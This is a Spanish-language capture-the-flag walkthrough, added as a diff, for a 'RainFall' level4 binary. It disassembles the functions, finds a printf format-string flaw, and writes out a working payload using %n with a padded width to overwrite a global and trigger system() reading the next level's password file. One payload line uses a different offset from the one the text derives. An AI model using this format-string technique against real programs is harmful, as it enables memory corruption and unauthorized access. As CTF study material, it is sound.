@@ -1,0 +1,77 @@
+1.- Similar al ejercicio anterior
+
+2.- Listamos las funciones
+  (gdb) info functions
+    [...]
+    0x08048444  p
+    0x08048457  n
+    0x080484a7  main
+    [...]
+
+3.- Desensamblamos main y vemos que lo único que hace es llamar a la función n
+  [...]
+  0x080484ad <+6>:	call   0x8048457 <n>
+  [...]
+
+4.- Desensamblamos n() y vemos varias cosas
+  1.- Se llama fgets() con argumento eax que es un buff de 0x200
+    [...]
+    0x0804847a <+35>:	call   0x8048350 <fgets@plt>
+    [...]
+  2.- Se llama a la función p() y como argumento esp que es el buffer obtenido de fgets()
+    [...]
+    0x08048477 <+32>:	mov    DWORD PTR [esp],eax
+    0x0804847a <+35>:	call   0x8048350 <fgets@plt>
+    [...]
+  3.- Hay un salto condicional si eax != 0x1025544
+    [...]
+    0x08048492 <+59>:	cmp    eax,0x1025544
+    0x08048497 <+64>:	jne    0x80484a5 <n+78>
+    [...]
+  4.- En caso de que eax = 0x1025544 hace una llamada a system() y como argumento
+    es "/bin/cat /home/user/level5/.pass"
+    [...]
+    0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
+    0x080484a0 <+73>:	call   0x8048360 <system@plt>
+    [...]
+    (gdb) x/s 0x8048590                                                                                            
+    0x8048590:	"/bin/cat /home/user/level5/.pass"
+  5.- Si conseguimos que la comparacion eax = 0x1025544 obtendremos la flag
+
+5.- Vamos a ver si en la función p() hay algo que podamos explotar
+
+6.- Desensamblamos p() vemos que hay un printf parecido al level3
+  [...]
+  0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
+  0x0804844d <+9>:	mov    DWORD PTR [esp],eax
+  0x08048450 <+12>:	call   0x8048340 <printf@plt>
+  0x08048455 <+17>:	leave  
+  0x08048456 <+18>:	ret
+  [...]
+  
+7.- El plan es el mismo que en level3 pero esta vez el parametro donde 
+  tendremos que insertar el valor estará más prufundo en el stack y que
+  hay una llamada a la funcion p() de por medio
+
+8.- Ejecutamos el binario e insertamos una cadena formateada
+  level4@RainFall:~$ ./level4 
+  AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+  AAAA b7ff26b0 bffffca4 b7fd0ff4 0 0 bffffc68 804848d bffffa60 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
+
+9.- Vemos que el parametro ahora queda en la posición 12
+
+10.- Debemos generar una cadena con la dirección 0x8049810 en little endian y se almacenará en la posición 12
+
+11.- Necesitamos inyectar el valor de 0x1025544 (16930116 en decimal) en el parametro 12 para eso usaremos el padding, 
+  la flag %n y el cambio de posiciín con 12$
+
+12.- La cadena debe quedar así
+  python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/payload
+  python -c 'import sys; sys.stdout.buffer.write(b"\x10\x98\x04\x08" + b"%16930112d%4$n")' > payload
+
+13.- Ejecutamos el binario y le pasamos la cadena formateada
+  cat /tmp/payload - | ./level4
+
+14.- En el stdout tendremos la flag
+
+
